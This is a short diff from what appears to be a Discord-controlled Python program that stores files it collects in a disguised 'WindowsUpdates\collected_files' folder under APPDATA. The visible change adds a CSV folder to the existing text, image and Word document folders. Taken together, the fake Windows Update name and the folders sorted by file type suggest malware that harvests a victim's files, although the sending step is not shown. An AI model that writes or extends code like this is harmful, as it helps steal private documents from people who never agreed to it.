@@ -44,6 +44,7 @@ async def on_ready():
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\txt")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\images")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\docx")
+        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\csv")
 
 @client.event
 async def on_message(message):
